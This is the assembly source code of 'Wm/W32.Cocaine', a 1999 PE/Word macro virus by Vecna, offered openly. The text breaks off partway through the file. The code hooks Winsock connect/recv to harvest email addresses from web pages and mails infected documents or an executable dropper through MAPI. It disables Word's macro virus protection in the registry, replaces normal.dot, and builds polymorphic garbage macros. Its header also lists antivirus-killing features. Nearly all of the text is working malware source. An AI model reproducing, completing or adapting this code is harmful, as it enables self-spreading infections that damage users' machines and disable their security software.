   ;Wm/W32.Cocaine - 22231 bytes
   ;(c) Vecna 1999
   ;
   ;I not in mood to write much, so, check the code and you will find:
   ;
   ;*full w32 compatibility
   ;*per-process residence(import table/getprocaddress)
   ;*direct action spreading
   ;*multipartite pe<->doc
   ;*http background spreading(send email to visited www pages)
   ;*attach infected documents(or files, if no documents) to outgoing messages
   ;*keep addressbook of already sended emails(crc32 only)
   ;*Commander Bomber/OneHalf infection scheme (island->island(*8)->poly)
   ;*several advanced poly loops in pe files
   ;*poly subroutines with local variables and params
   ;*advanced garbling
   ;*anti-emulation/anti-cryptanalisis internal decription loop
   ;*macro poly made by asm code
   ;*lz/rle compression
   ;*in memory created droppers
   ;*in memory encription(poly routines, macro stuf)
   ;*kill avp monitor
   ;*delete av files
   ;*msgbox payload(8 months incubation)
   ;*MAPI hooking
   ;*correct checksum in pe header(nt compliant)
   ;*memory mapping
   ;*multithread
   ;
   ;does other stuffs...
   ;
   ;Greetz go to Z0MBiE, VirusBuster and Reptile(the first to use macro autoload)

   .586p
   .model flat, STDCALL
   locals

   include host.inc

         ofs           equ offset
          by            equ byte ptr
          wo            equ word ptr
          dwo           equ dword ptr

          TRUE          EQU 1
          FALSE         EQU 0

          MAIL_DEBUG    EQU FALSE

          DIRECT        EQU TRUE

          MONTH_DELAY   EQU 8

          MAX_BRANCH    EQU 8                     ;beware DrWeb! (5 here=detect!)

          MAX_M_DEEP    EQU 6

          MAIL_PRIORITY EQU 10                    ;seconds

          MAX_SOCK      EQU 10

          DIV_VALUE     EQU 101

          MAX_PATH      EQU 260

          MIN_RAW       EQU (MAX_BRANCH+1)*100h

          vsize         equ vend - vcode

          msize         equ mend - vcode

   _VSEG  segment dword use32 public 'COCAINE'

   vcode  label

          db '(c) Vecna', 0

   FunDate db 0                                   ;month to activate

   InitWSOCK proc
          call @@1
   wsock32 db 'WSOCK32.DLL', 0
     @@1:
          call [ebp+(ofs _GetModuleHandle-ofs vcode)]
          test eax, eax
          jz @@0
          call @@2
          db 'connect',0
     @@2:
          push eax
          call @@3
          db 'recv', 0
     @@3:
          push eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _recv-ofs vcode)], eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [ebp+(ofs _connect-ofs vcode)], eax
          clc
          ret
     @@0:
          stc
          ret
   InitWSOCK endp

   http_install proc
          sub ecx, ecx
          call @@set_seh
          mov esp, [esp+8]
          call delta
          jmp @@fault
     @@set_seh:
          push dwo fs:[ecx]
          mov fs:[ecx], esp
          call InitWSOCK
          jc @@fault
          mov ebx, [ebp+(ofs _base-ofs vcode)]
     @@check:
          cmp wo [ebx], 'ZM'
          je @@found
     @@fault:
          sub ecx, ecx
          pop dwo fs:[ecx]
          pop ecx
          ret
     @@found:
          mov edi, [ebx+3ch]
          lea edi, [ebx+edi+128]
          mov edi, [edi]
     @@2:
          mov esi, [ebx+edi+12]
          test esi, esi
          jz @@ret
          add esi, ebx
          lodsd
          or eax, 20202020h
          cmp eax, 'cosw'
          je @@wsock
          add edi, 20
          jmp @@2
     @@wsock:
          mov esi, [ebx+edi+16]
          add esi, ebx
     @@searchloop:
          lodsd
          test eax, eax
          jz @@ret
          cmp eax, [ebp+(ofs _connect-ofs vcode)]
          jne @@3
          lea eax, [ebp+(ofs New_connect-ofs vcode)]
          lea edi, [esi-4]
          mov ecx, 4
          push esi
          push eax
          mov esi, esp                            ;fake buffer in stack
          call WriteMem
          pop esi
          pop esi
     @@3:
          cmp eax, [ebp+(ofs _recv-ofs vcode)]
          jne @@searchloop
          lea eax, [ebp+(ofs New_recv-ofs vcode)]
          lea edi, [esi-4]
          mov ecx, 4
          push esi
          push eax
          mov esi, esp                            ;fake buffer in stack
          call WriteMem
          pop esi
          pop esi
     @@ret:
          jmp @@fault
   http_install endp

   NewGetProcAddress proc
          push esp
          pushad
          call delta
          mov eax, [ebp+(ofs _GetProcAddress-ofs vcode)]
          mov [esp+(7*4)+4], eax
          call InitWSOCK
          jc @@1
          lea eax, [ebp+(ofs wsock32-ofs vcode)]
          push eax
          call [ebp+(ofs _GetModuleHandle-ofs vcode)]
          test eax, eax
          jz @@1
          cmp [esp+(7*4)+12], eax
          jnz @@1
          lea eax, [ebp+(ofs CheckWSOCK32-ofs vcode)]
          xchg [esp+(7*4)+8], eax
          mov [ebp+(ofs wsock_ret-ofs vcode)], eax
     @@1:
          popad
          ret
   NewGetProcAddress endp

   CheckWSOCK32 proc
          push ebp
          call delta
          cmp eax, [ebp+(ofs _connect-ofs vcode)]
          jne @@1
          lea eax, [ebp+(ofs New_connect-ofs vcode)]
          jmp @@2
     @@1:
          cmp eax, [ebp+(ofs _recv-ofs vcode)]
          jne @@2
          lea eax, [ebp+(ofs New_recv-ofs vcode)]
     @@2:
          pop ebp
          push 12345678h
     wsock_ret equ dwo $-4
          ret
   CheckWSOCK32 endp

   New_connect proc
          push esp
          pushad
          call delta
          mov eax, [ebp+(ofs _connect-ofs vcode)]
          mov [esp+(7*4)+4], eax
          mov esi, [esp+(7*4)+16]
          mov ax, wo [esi+2]                      ;port number
          cmp ax, 5000h                           ;80
          jne @@1
          mov eax, [esp+(7*4)+12]                 ;get socket
          mov ebx, [ebp+(ofs _socket-ofs vcode)]
          mov [ebp+(ofs socket-ofs vcode)+(ebx*4)], eax
          inc ebx
          cmp ebx, MAX_SOCK
          jne @@2
          sub ebx, ebx
     @@2:
          mov [ebp+(ofs _socket-ofs vcode)], ebx
     @@1:
          popad
          ret
   New_connect endp

   delta  proc
          call @@1
     @@1:
          pop ebp
          sub ebp, (ofs @@1-ofs vcode)
          ret
   delta  endp

   New_recv proc
          push esp
          pushad
          call delta
          mov eax, [ebp+(ofs _recv-ofs vcode)]
          mov [esp+(7*4)+4], eax
          mov eax, [esp+(7*4)+12]

          lea edi, [ebp+(ofs socket-ofs vcode)]
          mov ecx, MAX_SOCK
          repne scasd
          jecxz @@1

          mov eax, [esp+(7*4)+16]
          mov [ebp+(ofs recv_buff-ofs vcode)], eax
          mov eax, [esp+(7*4)+20]
          mov [ebp+(ofs recv_size-ofs vcode)], eax
          lea eax, [ebp+(ofs New_recv2-ofs vcode)]
          xchg [esp+(7*4)+8], eax
          mov [ebp+(ofs recv_ret-ofs vcode)], eax
     @@1:
          popad
          ret
   New_recv endp

   New_recv2 proc
          pushad
          call delta
          mov eax, [ebp+(ofs email_w-ofs vcode)]
          test eax, eax
          jnz @@0
          mov esi, [ebp+(ofs recv_buff-ofs vcode)]
          mov ecx, [ebp+(ofs recv_size-ofs vcode)]
          sub ecx, 8
     @@1:
          push ecx
          push esi
          lodsd
          or eax, 20202000h
          cmp eax, 'iam"'
          jne @@2
          lodsd
          or eax, 00202020h
          cmp eax, ':otl'
          jne @@2
          lea edi, [ebp+(ofs email-ofs vcode)]
          lea ebx, [edi+127]
     @@4:
          lodsb
          cmp al, '"'
          je @@3
          cmp al, '?'
          je @@3
          cmp edi, ebx
          je @@3
          stosb
          jmp @@4
     @@3:
          sub eax, eax
          stosb
          dec eax
          mov dwo [ebp+(ofs email_w-ofs vcode)], eax
     @@2:
          pop esi
          inc esi
          pop ecx
          loop @@1
     @@0:
          popad
          push 12345678h
     recv_ret equ dwo $-4
          ret
   New_recv2 endp

   MailThread proc
          cld
          mov ebp, [esp+4]
          sub eax, eax
          call @@set_seh
          mov esp, [esp+8]
          call delta
          push -1
          call [ebp+(ofs _Sleep-ofs vcode)]
     @@set_seh:
          push dwo fs:[eax]
          mov fs:[eax], esp
     @@main_loop:
          mov ecx, [ebp+(ofs email_w-ofs vcode)]
          test ecx, ecx
          jz @@no_queued

          lea esi, [ebp+(ofs email-ofs vcode)]

          push esi
          sub ecx, ecx
          cld
     @@1strlen:
          lodsb
          test al, al
          jz @@2strlen
          inc ecx
          jmp @@1strlen
     @@2strlen:
          mov edi, ecx
          pop esi

          call CRC32
          mov [ebp+(ofs email_crc-ofs vcode)], eax

          call CheckList
          test eax, eax
          jnz @@done

   IF MAIL_DEBUG EQ TRUE
          sub ecx, ecx
          push 4                                  ;yes/no
          lea eax, [ebp+(ofs title1-ofs vcode)]
          push eax
          lea eax, [ebp+(ofs email-ofs vcode)]
          push eax
          push ecx
          call [ebp+(ofs _MessageBoxA-ofs vcode)]
          cmp eax, 7                              ;no!
          je @@done
   ENDIF

          lea eax, [ebp+(ofs mapi-ofs vcode)]
          push eax
          call [ebp+(ofs _LoadLibraryA-ofs vcode)]
          test eax, eax
          jz @@done

          mov [ebp+(ofs _mapi-ofs vcode)], eax

          lea ecx, [ebp+(ofs sMAPISendMail-ofs vcode)]
          push ecx
          push eax
          call [ebp+(ofs _GetProcAddress-ofs vcode)]
          test eax, eax
          jz @@unload_mapi

          mov [ebp+(ofs _MAPISendMail-ofs vcode)], eax

          call OpenAncev
          jc @@file                               ;file dont exists, binary send
     @@doc:
          call GetTemplateDir
     @@1:
          lodsb
          test al, al
          jnz @@1
          lea edi, [esi-1]
          lea esi, [ebp+(ofs ndot-ofs vcode)]
     @@3:
          lodsb
          stosb
          test al, al
          jnz @@3
          lea esi, [ebp+(ofs directory-ofs vcode)]
          push 80h
          push esi
          call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
          test eax, eax
          jz @@file
          mov edx, 'COD.'
          jmp @@attach

     @@file:
          call CreateDropper
          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          push eax                                ;buffer
          mov eax, [ebp+(ofs fsizel-ofs vcode)]
          push eax                                ;size
          lea edi, [ebp+(ofs directory-ofs vcode)]
          push edi
          lea esi, [ebp+(ofs shitfile-ofs vcode)]
     @@4:
          lodsb
          stosb
          test al, al
          jnz @@4
          mov dwo [ebp+(ofs wd_att-ofs vcode)], 82h
          call WriteDump                          ;hidden dump
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs mm_on_off-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)]
          mov edx, 'EXE.'

     @@attach:

   DATA_SIZE = size MapiMessage + ((size MapiRecipDesc)*2) + size MapiFileDesc

   mapimsg = 0
   origin  = mapimsg + size MapiMessage
   destin  = origin + size MapiRecipDesc
   file    = destin + size MapiRecipDesc

          sub eax, eax
          mov ecx, DATA_SIZE
          sub esp, ecx
          mov edi, esp
          mov esi, edi
          rep stosb                               ;clear buffers we'll use

          lea eax, [esi+origin]
          mov [esi.mapimsg.lpOriginator], eax
          lea eax, [esi+destin]
          mov [esi.mapimsg.lpRecips], eax
          lea eax, [esi+file]
          mov [esi.mapimsg.lpFiles], eax

          push 1
          pop eax
          mov [esi.mapimsg.nFileCount], eax
          mov [esi.mapimsg.nRecipCount], eax
          mov [esi.destin.ulRecipClass], eax
          inc eax
          mov [esi.mapimsg.flags], eax
          lea eax, [ebp+(ofs email-ofs vcode)]
          mov [esi.destin.lpszName], eax
          mov [esi.destin.lpszAddress], eax
          lea eax, [ebp+(ofs directory-ofs vcode)]
          mov [esi.file.lpszPathName], eax

          lea edi, [ebp+(ofs fname-ofs vcode)]
          mov [esi.file.lpszFileName], edi
          call MakeVar
          mov eax, edx
          stosd
          sub eax, eax
          stosb

          mov eax, [ebp+(ofs subject-ofs vcode)]
          mov [esi.mapimsg.lpszSubject], eax

          call @@1aa
          db '', 0
     @@1aa:
          pop [esi.mapimsg.lpszNoteText]

          sub eax, eax
          push eax
          push eax
          push esi
          push eax
          push eax
          call [ebp+(ofs _MAPISendMail-ofs vcode)]
          test eax, eax
          jnz @@33

          sub eax, eax
          mov [ebp+(ofs mm_on_off-ofs vcode)], eax

          call InsertList

     @@33:
          add esp, DATA_SIZE

          lea eax, [ebp+(ofs shitfile-ofs vcode)]
          push eax
          call DeleteShitFile

     @@unload_mapi:
          mov eax, [ebp+(ofs _mapi-ofs vcode)]
          call [ebp+(ofs _FreeLibrary-ofs vcode)]
     @@done:
          sub eax, eax
          mov [ebp+(ofs email_w-ofs vcode)], eax
     @@no_queued:
          push MAIL_PRIORITY*1000
          call [ebp+(ofs _Sleep-ofs vcode)]
          jmp @@main_loop
   MailThread endp

   GetTemplateDir proc
          call @@2
          db 'SOFTWARE\Microsoft\Office\8.0\Common\FileNew\LocalTemplates', 0
     @@2:
          pop eax
          call ConsultKey
          ret
   GetTemplateDir endp

   CreateDropper proc
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 48*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)]
          mov [ebp+(ofs mm_on_off-ofs vcode)], eax
          sub edi, edi
          xchg edi, eax
          call @@1
     @@0:
          db04Dh, 05Ah, 050h, 000h, 000h, 000h, 002h, 000h
          db002h, 000h, 004h, 000h, 000h, 000h, 00Fh, 000h
          db000h, 000h, 0FFh, 0FFh, 000h, 001h, 000h, 0B8h
          db000h, 006h, 000h, 040h, 000h, 000h, 000h, 01Ah
          db000h, 021h, 000h, 001h, 000h, 001h, 000h, 0BAh
          db010h, 000h, 000h, 000h, 00Eh, 01Fh, 0B4h, 009h
          db0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
          db090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
          db06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
          db073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
          db06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
          db057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
          db037h, 000h, 087h, 000h, 050h, 045h, 000h, 001h
          db000h, 04Ch, 001h, 004h, 000h, 000h, 000h, 074h
          db025h, 0F5h, 00Eh, 000h, 007h, 000h, 0E0h, 000h
          db000h, 000h, 08Eh, 081h, 00Bh, 001h, 002h, 019h
          db000h, 000h, 000h, 002h, 000h, 002h, 000h, 006h
          db000h, 006h, 000h, 010h, 000h, 002h, 000h, 010h
          db000h, 002h, 000h, 020h, 000h, 003h, 000h, 040h
          db000h, 001h, 000h, 010h, 000h, 002h, 000h, 002h
          db000h, 001h, 000h, 001h, 000h, 006h, 000h, 003h
          db000h, 000h, 000h, 00Ah, 000h, 005h, 000h, 050h
          db000h, 002h, 000h, 004h, 000h, 005h, 000h, 002h
          db000h, 004h, 000h, 010h, 000h, 001h, 000h, 020h
          db000h, 003h, 000h, 010h, 000h, 001h, 000h, 010h
          db000h, 005h, 000h, 010h, 000h, 00Bh, 000h, 030h
          db000h, 001h, 000h, 054h, 000h, 01Bh, 000h, 040h
          db000h, 001h, 000h, 00Ch, 000h, 052h, 000h, 043h
          db04Fh, 044h, 045h, 000h, 004h, 000h, 002h, 000h
          db002h, 000h, 010h, 000h, 002h, 000h, 002h, 000h
          db002h, 000h, 006h, 000h, 00Dh, 000h, 020h, 000h
          db001h, 000h, 060h, 044h, 041h, 054h, 041h, 000h
          db004h, 000h, 002h, 000h, 002h, 000h, 020h, 000h
          db002h, 000h, 002h, 000h, 002h, 000h, 008h, 000h
          db00Dh, 000h, 040h, 000h, 001h, 000h, 0C0h, 02Eh
          db069h, 064h, 061h, 074h, 061h, 000h, 002h, 000h
          db002h, 000h, 002h, 000h, 030h, 000h, 002h, 000h
          db002h, 000h, 002h, 000h, 00Ah, 000h, 00Dh, 000h
          db040h, 000h, 001h, 000h, 0C0h, 02Eh, 072h, 065h
          db06Ch, 06Fh, 063h, 000h, 002h, 000h, 002h, 000h
          db002h, 000h, 040h, 000h, 002h, 000h, 002h, 000h
          db002h, 000h, 00Ch, 000h, 00Dh, 000h, 040h, 000h
          db001h, 000h, 050h, 000h, 067h, 003h, 06Ah, 000h
          db000h, 000h, 0E8h, 000h, 003h, 000h, 0FFh, 025h
          db030h, 030h, 040h, 000h, 0F3h, 003h, 028h, 030h
          db000h, 009h, 000h, 038h, 030h, 000h, 001h, 000h
          db030h, 030h, 000h, 015h, 000h, 046h, 030h, 000h
          db005h, 000h, 046h, 030h, 000h, 005h, 000h, 04Bh
          db045h, 052h, 04Eh, 045h, 04Ch, 033h, 032h, 02Eh
          db064h, 06Ch, 06Ch, 000h, 003h, 000h, 045h, 078h
          db069h, 074h, 050h, 072h, 06Fh, 063h, 065h, 073h
          db073h, 000h, 0ADh, 001h, 010h, 000h, 001h, 000h
          db00Ch, 000h, 002h, 000h, 009h, 030h
     @@1:
          pop esi
          mov ecx, ofs @@1-ofs @@0
     @@2:
          lodsb
          stosb
          test al, al
          jnz @@3
          dec ecx
          dec ecx
          lodsw
          push ecx
          xor ecx, ecx
          xchg ecx, eax
          jecxz @@4
          rep stosb
     @@4:
          pop ecx
     @@3:
          loop @@2
          mov [ebp+(ofs fsizeh-ofs vcode)], ecx
          mov dwo [ebp+(ofs fsizel-ofs vcode)], 4096
          call Infect
          ret
   CreateDropper endp

   random_f proc
          push eax
          call random0
          pop eax
          ret
   random_f endp

   macro_start equ this byte

   include ndot.inc

   MacroSpread proc
          sub ecx, ecx
          call @@set_seh
          mov esp, [esp+8]
          call delta
          jmp @@0
     @@set_seh:
          push dwo fs:[ecx]
          mov fs:[ecx], esp

          call OpenAncev
          jc @@1                                  ;dont exists, macro spread
          mov eax, 10
          call random
          or eax, eax                             ;just in case that we are
          jnz @@0                                 ;reinfecting
     @@1:
          call @@2
     @@1v dd 0
     @@2:
          push 000F003Fh                          ;KEY_ALL_ACCESS
          push 0
          call @@3
          db 'SOFTWARE\Microsoft\Office\8.0\Word\Options', 0
     @@3:
          push 80000001H                          ;HKEY_CURRENT_USER
          call [ebp+(ofs _RegOpenKeyEx-ofs vcode)]
          test eax, eax
          jnz @@0
          push 1                                  ;size
          call @@4
          db '0', 0
     @@4:
          push 1                                  ;type
          push 0
          call @@5
          db 'EnableMacroVirusProtection', 0           ;key entry
     @@5:
          push dwo [ebp+(ofs @@1v-ofs vcode)]
          call [ebp+(ofs _RegSetValueEx-ofs vcode)]
          push dwo [ebp+(ofs @@1v-ofs vcode)]
          call [ebp+(ofs _RegCloseKey-ofs vcode)] ;close key
          call GetTemplateDir
          cld
          push esi
     @@6:
          lodsb
          test al, al
          jnz @@6
          lea edi, [esi-1]
          lea esi, [ebp+(ofs ndot-ofs vcode)]
     @@8:
          lodsb
          stosb
          test al, al
          jnz @@8
          call DeleteShitFile
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 48*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)];alloc memory for my normal.dot
          mov [ebp+(ofs mm_on_off-ofs vcode)], eax
          lea eax, [ebp+(ofs normaldot-ofs vcode)]
          push eax
          push normaldot_size
          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          push eax
          lea eax, [ebp+(ofs normaldot_sized-ofs vcode)]
          push eax
          call lzrw1_decompress                   ;unpack normaldot
          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          push eax
          mov eax, [ebp+(ofs normaldot_sized-ofs vcode)]
          push eax
          lea eax, [ebp+(ofs directory-ofs vcode)]
          push eax                                ;dump not hidden
          mov dwo [ebp+(ofs wd_att-ofs vcode)], 80h
          call WriteDump                          ;create/write new normal.dot
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs mm_on_off-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from normal.dot
          call CreateDropper
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 150*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)]
          mov [ebp+(ofs dbgscript-ofs vcode)], eax
          mov edi, eax
          push eax
          mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
          mov ecx, dwo [ebp+(ofs fsizel-ofs vcode)]
          call script                             ;make debug script
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs mm_on_off-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from EXE dropper
          pop eax
          sub edi, eax
          mov [ebp+(ofs dbgscript_size-ofs vcode)], edi
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 4*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)] ;alloc memory for macro text
          mov [ebp+(ofs mm_on_off-ofs vcode)], eax
          lea eax, [ebp+(ofs macros-ofs vcode)]
          push eax
          push macro_size
          mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
          push eax
          lea eax, [ebp+(ofs macro_sized-ofs vcode)]
          push eax
          call lzrw1_decompress                   ;unpack normaldot
          mov ecx, [ebp+(ofs macro_sized-ofs vcode)]
          mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
          lea edi, [esi+ecx+4]                    ;edi=buffer for vars
          mov [ebp+(ofs variables-ofs vcode)], edi
          mov ebx, edi
     @@9:
          lodsb
          cmp al, 'A'
          jb @@10
          cmp al, 'Z'
          ja @@10
          call random_f
          jc @@10
          sub al, 'A'-'a'
     @@10:
          mov [esi-1], al
          loop @@9
          mov ecx, 10                             ;generate variables
     @@13:
          push ecx
          mov eax, 8                             ;lenght of the name of variable
          call random
          inc eax
          inc eax
          mov ecx, eax
     @@12:
          mov eax, 'Z'-'A'
          call random
          add al, 'A'
          call random_f
          jc @@11
          sub al, 'A'-'a'
     @@11:
          stosb
          loop @@12
          sub eax, eax
          stosb
          pop ecx
          loop @@13                         ;next variable
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 4*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)] ;alloc memory for macro text
          push eax
          mov edi, eax
          mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
     @@14:
          lodsb
          cmp al, '%'
          jne @@18
          lodsb
          sub al, '0'
          push ebx
          push esi
          movzx ecx, al
          mov esi, ebx
     @@15:
          lodsb
          test al, al
          jnz @@15
          loop @@15
     @@16:
          lodsb
          test al, al
          jz @@17
          stosb
          jmp @@16
     @@17:
          pop esi
          pop ebx
          mov al, 12h
        org $-1
     @@18:
          stosb
          lea eax, [ebx-4]
          cmp esi, eax
          jb @@14
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs mm_on_off-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free mem macro code (unprocess)
          mov ecx, edi
          pop esi
          sub ecx, esi
          push ecx
          mov [ebp+(ofs mm_on_off-ofs vcode)], esi
          push 00000040h
          push 00002000h+00001000h+00100000h
          push 150*1024
          push 0
          call [ebp+(ofs _VirtualAlloc-ofs vcode)] ;alloc memory for macro text
          sub ecx, ecx
          sub ebx, ebx
          mov edi, eax
          xchg eax, [esp]
          xchg eax, ecx
          add ecx, [ebp+(ofs mm_on_off-ofs vcode)];ecx=limit of macro template
          mov by [ebp+(ofs mdeep-ofs vcode)], -1
     @@19:
          mov esi, [ebp+(ofs mm_on_off-ofs vcode)]
          inc ah
          cmp ah, 2
          jne @@20
          mov by [ebp+(ofs mdeep-ofs vcode)], 0
     @@20:
          cmp ah, 8
          jne @@21
          mov by [ebp+(ofs mdeep-ofs vcode)], -1
     @@21:
          cmp ah, 6
          jne @@22
          mov esi, [ebp+(ofs dbgscript-ofs vcode)]
          push ecx
          mov ecx, [ebp+(ofs dbgscript_size-ofs vcode)]
          rep movsb
          pop ecx
          call MacroGarble
          jmp @@19
     @@22:
          cmp ah, 9
          je @@28
     @@23:
          cmp esi, ecx
          jb @@24                               ;all buffer scanned?
          test ebx, ebx
          jz @@19                          ;nothing we was searching exists
          mov esi, [ebp+(ofs mm_on_off-ofs vcode)];it exists, but we skipped!
          sub ebx, ebx
     @@24:
          lodsb
          cmp al, ah
          jne @@27                          ;find line we're searching
          inc ebx                                 ;flag found
          push eax
          mov ax, 100
          call random
          cmp eax, 33                             ;1/3
          pop eax
          jnb @@27                          ;skip this time
          mov by [esi-1], 9                       ;flag as done
     @@25:
          lodsb
          test al, al
          jz @@26
          stosb
          cmp al, 10
          jne @@25
          call MacroGarble                       ;after CRLF, insert garbage
          jmp @@25
     @@26:
          jmp @@23
     @@27:
          lodsb
          test al, al
          jnz @@27                          ;seek till next line
          jmp @@23
     @@28:
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs mm_on_off-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from macro code
          mov eax, [esp]                         ;get buffer from stack
          push eax
          sub edi, eax
          push edi
          lea eax, [ebp+(ofs cokefile-ofs vcode)]
          push eax
          mov dwo [ebp+(ofs wd_att-ofs vcode)], 82h
          call WriteDump                          ;create/write new normal.dot
          pop eax                                 ;buffer
          push 00004000h+00008000h
          push 0
          push eax
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from complete code
          push 00004000h+00008000h
          push 0
          push dwo [ebp+(ofs dbgscript-ofs vcode)]
          call [ebp+(ofs _VirtualFree-ofs vcode)] ;free memory from debug script
     @@0:
          sub ecx, ecx
          pop dwo fs:[ecx]
          pop ecx
          sub eax, eax
          mov dwo [ebp+(ofs mm_on_off-ofs vcode)], eax
          add al, '0'
          mov by [ebp+(ofs dmt1-ofs vcode)], al
          mov by [ebp+(ofs dmt2-ofs vcode)+7], al
          mov by [ebp+(ofs outcmd-ofs vcode)+7], al
          mov by [ebp+(ofs ssize-ofs vcode)+7], al
          mov by [ebp+(ofs coda-ofs vcode)+7], al
          mov by [ebp+(ofs dmt3-ofs vcode)+7], al
          mov by [ebp+(ofs dmt4-ofs vcode)+7], al
          mov by [ebp+(ofs dmt5-ofs vcode)+7], al
          ret
   MacroSpread endp

   MacroGarble proc
          push eax
          push ecx
          push esi
          cmp by [ebp+(ofs mdeep-ofs vcode)], MAX_M_DEEP
          jae @@0
          inc by [ebp+(ofs mdeep-ofs vcode)]
          mov eax, 4
          call random
          add eax, 2
          mov ecx, eax
     @@1:
          push ecx
     @@2:
          mov eax, 16
          call random
          cmp al, 10
          je @@remark
          cmp al, 11
          je @@for
          cmp al, 12
          je @@variables
          cmp al, 13
          je @@if
          cmp al, 14
          je @@10
          jmp @@2
     @@if:
          mov eax, '  fI'
          stosd
          dec edi
          call MakeVar
          mov eax, ' = '
          call random_f
          jc @@3
          dec ah
          call random_f
          jc @@3
          inc ah
          inc ah
     @@3:
          stosd
          dec edi
          call MakeVar
          mov eax, 'ehT '
          stosd
          mov eax, 000a0d00h+'n'
          stosd
          dec edi
          call MacroGarble
          call @@4
          db 'End If', 13, 10
     @@4:
          pop esi
          movsd
          movsd
          jmp @@10
     @@remark:
          call random_f
          jc @@5
          mov al, "'"
          stosb
          jmp @@6
     @@5:
          mov eax, ' meR'
          stosd
     @@6:
          call MakeVar
          call MakeVar
     @@7:
          mov ax, 0a0dh
          stosw
          jmp @@10
     @@variables:
          call MakeVar
          call random_f
          jc @@string
          mov eax, ' = '
          stosd
          dec edi
          call MakeNumber
     @@8:
          jmp @@7
     @@string:
          call MakeVar
          mov eax, ' = $'
          stosd
          mov al, '"'
          stosb
          call MakeVar
          mov al, '"'
          stosb
          jmp @@8
     @@for:
          mov eax, ' roF'
          stosd
          push edi
          call MakeVar
          mov eax, ' = '
          stosd
          dec edi
          call MakeNumber
          mov eax, ' oT '
          stosd
          call MakeNumber
          mov ax, 0a0dh
          stosw
          call MacroGarble
          mov eax, 'txeN'
          stosd
          mov al, ' '
          stosb
          pop esi
     @@9:
          lodsb
          cmp al, ' '
          je @@8
          stosb
          jmp @@9
     @@10:
          pop ecx
          dec ecx
          jnz @@1
          dec by [ebp+(ofs mdeep-ofs vcode)]
     @@0:
          pop esi
          pop ecx
          pop eax
          ret
   MacroGarble endp

   MakeNumber proc
          push ecx
          push eax
          mov eax, 2
          call random
          inc eax
          mov ecx, eax
     @@1:
          mov eax, '9'-'0'
          call random
          add al, '0'
          stosb
          loop @@1
          pop eax
          pop ecx
          ret
   MakeNumber endp

   include lz.inc

   include macro.inc

   update_address proc
          push eax ecx
          db 0b8h
   addr   dd 0                                    ;get address to eax
          mov ecx, 4
     @@1:
          rol ax, 4
          call mhex                               ;print hex digits
          loop @@1
          add dwo [ebp+(ofs addr-ofs vcode)], 10h ;update address
          pop ecx eax
          ret
   update_address endp

   mhex proc
          push eax ebx
          and eax, 01111b                         ;lower nibble
          call $+21
          db '0123456789ABCDEF'
          pop ebx
          xlat                                    ;turn it in hex digit
          stosb
          pop ebx eax
          ret
   mhex endp

   copy_line proc
          push eax
     @@0:
          lodsb
          or al, al
          jz @@1                                  ;zero found, stop copy
          stosb
          jmp @@0
     @@1:
          pop eax
          ret
   copy_line endp

   make_hex proc
          push eax ecx esi
          db 0b8h+6
   iaddr  dd 0                                    ;esi<->actual buffer position
          inc dwo [ebp+(ofs iaddr-ofs vcode)]     ;set next
          mov al, 20h
          stosb                                   ;print space
          lodsb
          rol al, 4
          call mhex                               ;print upper nibble
          rol al, 4
          call mhex                               ;print lower nibble
          pop esi ecx eax
          loop make_hex
          ret
   make_hex endp

   script proc
          cld
          call debugmutator
          mov dwo [ebp+(ofs  addr-ofs vcode)], 0100h
          mov [ebp+(ofs iaddr-ofs vcode)], esi    ;set vars
          lea esi, [ebp+(ofs intro-ofs vcode)]
          call copy_line                          ;copy intro code
          mov eax, 16
          cdq
          xchg eax, ecx
          div ecx                                 ;ecx=number of 16-bytes lines
          mov ecx, eax                            ;edx=remainder for last line
     @@0:
          push ecx
          lea esi, [ebp+(ofs outcmd-ofs vcode)]
          call copy_line                          ;print
          call update_address                     ;address
          mov ecx, 16
          call make_hex                           ;code to assemble
          mov eax, 000A0D00h+'"'
          stosd                                   ;next line
          dec edi
          pop ecx
          loop @@0
          mov ecx, edx
          jecxz @@1                               ;no remainder?
          lea esi, [ebp+(ofs outcmd-ofs vcode)]
          call copy_line
          call update_address                     ;make last line
          call make_hex
          mov eax, 000A0D00h+'"'
          stosd
          dec edi
          sub wo [ebp+(ofs addr-ofs vcode)], 10h  ;undo damage
     @@1:
          lea esi, [ebp+(ofs ssize-ofs vcode)]
          call copy_line                          ;rcx
          add wo [ebp+(ofs addr-ofs vcode)], dx
